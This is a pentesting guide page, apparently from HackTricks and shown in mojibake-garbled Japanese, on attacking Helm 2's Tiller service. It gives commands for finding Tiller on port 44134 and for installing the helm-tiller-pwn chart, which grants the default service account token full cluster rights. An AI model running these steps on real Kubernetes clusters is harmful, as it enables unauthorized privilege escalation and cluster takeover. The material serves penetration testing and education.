<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã€å½“ç¤¾ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹ã€‚
* **HackTricks**ï¼ˆhttps://github.com/carlospolop/hacktricksï¼‰ãŠã‚ˆã³**HackTricks Cloud**ï¼ˆhttps://github.com/carlospolop/hacktricks-cloudï¼‰ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>


# åŸºæœ¬æƒ…å ±

Helmã¯Kubernetesã®**ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ãƒãƒãƒ¼ã‚¸ãƒ£**ã§ã™ã€‚YAMLãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸åŒ–ã—ã¦å…¬é–‹ãŠã‚ˆã³ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆãƒªãƒã‚¸ãƒˆãƒªã§é…å¸ƒã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¯**Helm Charts**ã¨å‘¼ã°ã‚Œã¾ã™ã€‚**Tiller**ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ãƒãƒ¼ãƒˆ44134ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹**ã‚µãƒ¼ãƒ“ã‚¹**ã§ã™ã€‚

**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆ:** 44134
```
PORT      STATE SERVICE VERSION
44134/tcp open  unknown
```
# åˆ—æŒ™

ç•°ãªã‚‹åå‰ç©ºé–“ã®**ãƒãƒƒãƒ‰ãŠã‚ˆã³/ã¾ãŸã¯ã‚µãƒ¼ãƒ“ã‚¹ã‚’åˆ—æŒ™**ã§ãã‚‹å ´åˆã¯ã€ãã‚Œã‚‰ã‚’åˆ—æŒ™ã—ã¦ã€åå‰ã«**"tiller"**ãŒå«ã¾ã‚Œã‚‹ã‚‚ã®ã‚’æ¤œç´¢ã—ã¾ã™ï¼š
```bash
kubectl get pods | grep -i "tiller"
kubectl get services | grep -i "tiller"
kubectl get pods -n kube-system | grep -i "tiller"
kubectl get services -n kube-system | grep -i "tiller"
kubectl get pods -n <namespace> | grep -i "tiller"
kubectl get services -n <namespace> | grep -i "tiller"
```
ä¾‹ï¼š
```bash
kubectl get pods -n kube-system
NAME                                       READY   STATUS             RESTARTS   AGE
kube-scheduler-controlplane                1/1     Running            0          35m
tiller-deploy-56b574c76d-l265z             1/1     Running            0          35m

kubectl get services -n kube-system
NAME            TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE
kube-dns        ClusterIP   10.96.0.10     <none>        53/UDP,53/TCP,9153/TCP   35m
tiller-deploy   ClusterIP   10.98.57.159   <none>        44134/TCP                35m
```
You could also try to find this service running checking the port 44134:  

### ãƒãƒ¼ãƒˆ44134ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã€ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
```bash
sudo nmap -sS -p 44134 <IP>
```
ä¸€åº¦ãã‚Œã‚’ç™ºè¦‹ã—ãŸã‚‰ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆhelmã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦é€šä¿¡ã§ãã¾ã™ã€‚ `homebrew`ãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã‹ã€[**å…¬å¼ãƒªãƒªãƒ¼ã‚¹ãƒšãƒ¼ã‚¸**](https://github.com/helm/helm/releases)**ã‚’å‚ç…§ã—ã¦ãã ã•ã„**ã€‚è©³ç´°ã‚„ä»–ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã«ã¤ã„ã¦ã¯ã€[ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã‚¬ã‚¤ãƒ‰](https://v2.helm.sh/docs/using\_helm/#installing-helm)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

ãã®å¾Œã€**ã‚µãƒ¼ãƒ“ã‚¹ã‚’åˆ—æŒ™**ã§ãã¾ã™ï¼š
```
helm --host tiller-deploy.kube-system:44134 version
```
## ç‰¹æ¨©æ˜‡æ ¼

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€**Helm2** ã¯ **kube-system** ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã« **é«˜ã„æ¨©é™** ã§ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã¾ã—ãŸã€‚ãã®ãŸã‚ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚’è¦‹ã¤ã‘ã¦ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ã“ã‚Œã«ã‚ˆã‚Š **æ¨©é™ã‚’æ˜‡æ ¼** ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

å¿…è¦ãªã®ã¯ã€æ¬¡ã®ã‚ˆã†ãªãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹ã ã‘ã§ã™: [**https://github.com/Ruil1n/helm-tiller-pwn**](https://github.com/Ruil1n/helm-tiller-pwn) ã“ã‚Œã«ã‚ˆã‚Šã€**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚µãƒ¼ãƒ“ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚¯ãƒ©ã‚¹ã‚¿å…¨ä½“ã®ã™ã¹ã¦ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹** ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚
```
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
/pwnchart
```
[http://rui0.cn/archives/1573](http://rui0.cn/archives/1573)ã«ã¯**æ”»æ’ƒã®èª¬æ˜**ãŒã‚ã‚Šã¾ã™ãŒã€åŸºæœ¬çš„ã«ã¯_helm-tiller-pwn/pwnchart/templates/_å†…ã®[**clusterrole.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrole.yaml)ã¨[**clusterrolebinding.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrolebinding.yaml)ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã‚€ã¨ã€**ã™ã¹ã¦ã®æ¨©é™ãŒãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã«ä¸ãˆã‚‰ã‚Œã¦ã„ã‚‹**ã®ãŒã‚ã‹ã‚Šã¾ã™ã€‚
